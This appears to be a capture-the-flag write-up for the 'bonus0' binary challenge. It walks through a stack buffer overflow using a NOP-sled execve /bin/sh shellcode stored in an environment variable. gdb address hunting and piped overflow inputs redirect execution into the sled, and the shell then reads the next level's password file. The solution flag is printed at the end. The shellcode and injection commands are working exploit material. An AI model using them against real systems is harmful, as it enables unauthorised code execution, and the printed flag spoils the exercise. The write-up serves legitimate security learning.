# bonus0

## disassemble

```shell
objdump -dC -M intel bonus0
```

## exploit

* shellcode (https://www.exploit-db.com/exploits/42428) : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

```shell
export SHELLCODE=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

gdb bonus0
(gdb) break main
(gdb) run
(gdb) x/21s 0xbffff706
0xbffff861:      "/home/user/bonus0/bonus0"
0xbffff87a:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"
```

```shell
python2.7 -c 'print("A" * 20)'
AAAAAAAAAAAAAAAAAAAA
```

```shell
mkfifo /tmp/bonus0.pipe
sleep infinity > /tmp/bonus0.pipe &
gdb bonus0 < /tmp/bonus0.pipe
```

```shell
echo "run" >> /tmp/bonus0.pipe
echo -e "AAAAAAAAAAAAAAAAAAAA" >> /tmp/bonus0.pipe
echo -e "abcdefghijklmnopqrstuvwxyz." >> /tmp/bonus0.pipe
```

```shell
echo "run" >> /tmp/bonus0.pipe
echo -e "AAAAAAAAAAAAAAAAAAAA" >> /tmp/bonus0.pipe
echo -e "abcdefghi....nopqrstuvwxyz." >> /tmp/bonus0.pipe
```

```shell
gdb bonus0
(gdb) x/42wx 0xbffff87a
0xbffff87a:     0x4c454853      0x444f434c      0x90903d45      0x90909090
0xbffff88a:     0x90909090      0x90909090      0x90909090      0x90909090
```

```shell
echo "run" >> /tmp/bonus0.pipe
echo -e "AAAAAAAAAAAAAAAAAAAA" >> /tmp/bonus0.pipe
# 0xbffff88a --> \x8a\xf8\xff\xbf
echo -e "abcdefghi\x7a\xf8\xff\xbfnopqrstuvwxyz." >> /tmp/bonus0.pipe
```

```shell
./bonus0 < /tmp/bonus0.pipe
echo -e "AAAAAAAAAAAAAAAAAAAA" >> /tmp/bonus0.pipe
echo -e "abcdefghi\x8a\xf8\xff\xbfnopqrstuvwxyz." >> /tmp/bonus0.pipe
echo -e "cat /home/user/bonus1/.pass" >> /tmp/bonus0.pipe
```

## flag

```shell
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
